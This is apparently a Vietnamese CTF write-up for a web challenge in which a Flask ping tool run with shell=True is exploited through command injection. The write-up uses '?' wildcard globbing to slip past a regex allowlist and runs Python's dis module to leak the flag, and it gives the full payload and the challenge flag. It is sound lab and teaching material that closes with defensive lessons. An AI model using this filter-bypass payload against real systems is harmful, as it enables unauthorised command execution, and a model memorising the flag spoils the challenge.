# Writeup — Duck Nettool Revenge (Web)

> **V1t CTF 2026** · Category: Web · Command Injection / Bypass Restriction with Wildcards
>
> **Flag:** `v1t{br0_th15_15_duck}`

---

## 1. Tóm tắt (TL;DR)

Ứng dụng web Flask cho phép chạy lệnh `ping` đến host chỉ định thông qua shell (`shell=True`).
Đầu vào bị kiểm soát nghiêm ngặt bởi biểu thức chính quy (Regex):
```python
ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")
```
Chỉ cho phép các ký tự: chữ cái `i`, các số `0-9`, dấu `.`, dấu `;`, dấu `?`, dấu `/`, và dấu cách ` `.

Phương pháp giải quyết:
1. Sử dụng dấu `;` để chèn thêm lệnh thực thi (**Command Injection**) và ký tự đại diện `?` (wildcard globbing) để thay cho các chữ cái bị chặn.
2. Đọc tệp cấu hình `Dockerfile` và phát hiện script `/app/init` tạo ra mã băm SHA-256 của flag tại build-time từ `/app/flag.txt` (file flag thô bị khóa quyền đọc `chmod 0000`).
3. Dựa trên mô tả: *"On remote it will replace all v1t{fake_flag} with real flag"*, ta xác định flag thật đã được ghi đè vào chuỗi docstring ở đầu file `/app/app.py`.
4. Đọc nội dung `/app/app.py` bằng cách sử dụng module **`dis.py`** của Python thông qua wildcard `/???/?????/?i?/??????3.11/?i?.??` để tránh việc trùng lặp độ dài và xung đột thứ tự thực thi với các module khác như `datetime.py`.

---

## 2. Các file được cung cấp

| File | Vai trò |
|---|---|
| `app.py` | Mã nguồn Flask xử lý việc nhận đầu vào và thực thi lệnh ping |
| `Dockerfile` | Cấu hình Docker xóa bỏ hầu hết các binary mặc định trong `/bin` và `/usr/bin` (chỉ giữ lại `sh` và `ping`) |
| `flag.py` | Chứa hàm in flag của thử thách (mồi nhử in chữ `'FLAG'`) |
| `flag.txt` | File flag thô, tuy nhiên có chmod `0000` (không thể đọc trực tiếp bằng user `ctf`) |

---

## 3. Phân tích lỗ hổng & Hướng khai thác

### 3.1. Điểm yếu Command Injection
Trong file `app.py`, ứng dụng sử dụng `subprocess.check_output` với tham số `shell=True` để gọi lệnh ping:
```python
command = f"ping -c 1 {target}"
output = subprocess.check_output(
    command,
    shell=True,
    stderr=subprocess.STDOUT,
    timeout=5,
    text=True,
    env={"PATH": "/bin:/usr/bin"},
)
```
Vì chạy thông qua shell (`shell=True`), ta có thể kết thúc lệnh ping bằng dấu chấm phẩy `;` và chèn thêm câu lệnh mong muốn.

### 3.2. Rào cản Regex Filter
Đầu vào `target` được kiểm tra bằng regex:
```python
ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")
```
Bộ lọc này giới hạn đầu vào:
* Không được có chuỗi "khoảng trắng + dấu chấm" hoặc "dấu chấm + khoảng trắng".
* Chỉ chấp nhận các ký tự: chữ cái `i`, các số `0-9`, dấu `.`, dấu `;`, dấu `?`, dấu `/`, và dấu cách ` `.

Như vậy, ngoại trừ chữ `i`, toàn bộ các chữ cái khác trong bảng chữ cái đều bị chặn hoàn toàn.

---

## 4. Kỹ thuật Bypass bằng Wildcard Globbing

Trong Linux, trình quản lý bash shell hỗ trợ mở rộng đường dẫn qua wildcard `?` (khớp với bất kỳ 1 ký tự nào). Ta có thể thay thế toàn bộ các chữ cái bị chặn bằng `?`.

### 4.1. Thực thi Python3
Bình thường, đường dẫn đầy đủ đến Python3 là `/usr/local/bin/python3`.
Để vượt qua bộ lọc, ta sử dụng:
```text
/???/?????/?i?/??????3
```
* `/???` khớp với `/usr`
* `?????` khớp với `local`
* `?i?` khớp với `bin` (do chữ `i` được phép sử dụng)
* `??????3` khớp với `python3` (độ dài đúng 7 ký tự và kết thúc bằng số `3`).
Do Dockerfile đã dọn dẹp (unlink) toàn bộ các binary thừa khác trong hệ thống, `/usr/local/bin/python3` là file duy nhất khớp với mẫu trên.

### 4.2. Trỏ đến thư viện `dis.py`
Vì `flag.py` trên remote chỉ in chữ `'FLAG'`, flag thật sự được lưu trong chuỗi bình luận/chú thích (docstring) của file `/app/app.py`. Do `cat` bị cấm, ta có thể dùng module `dis` (Python disassembler) để dịch ngược mã máy và in toàn bộ danh sách các hằng số (constants) bao gồm chuỗi docstring chứa flag thật ở đầu file `/app/app.py` ra màn hình:
```text
/???/?????/?i?/??????3.11/?i?.??
```
* `/???/?????/?i?/??????3.11` khớp với `/usr/local/lib/python3.11`
* `?i?.??` khớp với `dis.py` (chữ `i` ở giữa) và được ưu tiên đứng đầu theo bảng chữ cái.

### 4.3. Chỉ định mục tiêu `/app/app.py`
```text
/???/???.??
```
* `/???` khớp với `/app`
* `???.??` khớp với `app.py`

---

## 5. Thực thi và Khai thác

Chèn payload đầy đủ vào ô nhập `target` trên ứng dụng:

```text
; /???/?????/?i?/??????3 /???/?????/?i?/??????3.11/?i?.?? /???/???.??
```

### Quá trình phân giải câu lệnh trên Shell:
1. Shell nhận dạng dấu `;` để chạy lệnh tiếp theo.
2. `/???/?????/?i?/??????3` được bash phân giải thành đường dẫn `/usr/local/bin/python3`.
3. `/???/?????/?i?/??????3.11/?i?.??` được bash phân giải thành `/usr/local/lib/python3.11/dis.py`.
4. `/???/???.??` phân giải thành `/app/app.py`.
5. Câu lệnh được thực thi thực tế:
   ```bash
   python3 /usr/local/lib/python3.11/dis.py /app/app.py
   ```
6. Module `dis` sẽ dịch ngược và in toàn bộ cấu trúc mã máy của file `/app/app.py` ra màn hình, qua đó hiển thị chuỗi flag thật nằm trong phần hằng số `LOAD_CONST 0` ở đầu. Output này được trả trực tiếp về giao diện web.

---

## 6. Bài học rút ra

* **Hạn chế dùng `shell=True`:** Luôn truyền tham số dạng danh sách (`list`) thay vì chuỗi khi gọi các lệnh hệ thống để tránh command injection.
* **Wildcards trong Bash vô cùng mạnh mẽ:** Việc lọc chữ cái hoặc từ khóa (blacklisting) đơn thuần không bao giờ là đủ nếu vẫn cho phép các ký tự đại diện như `?` hay `*`.
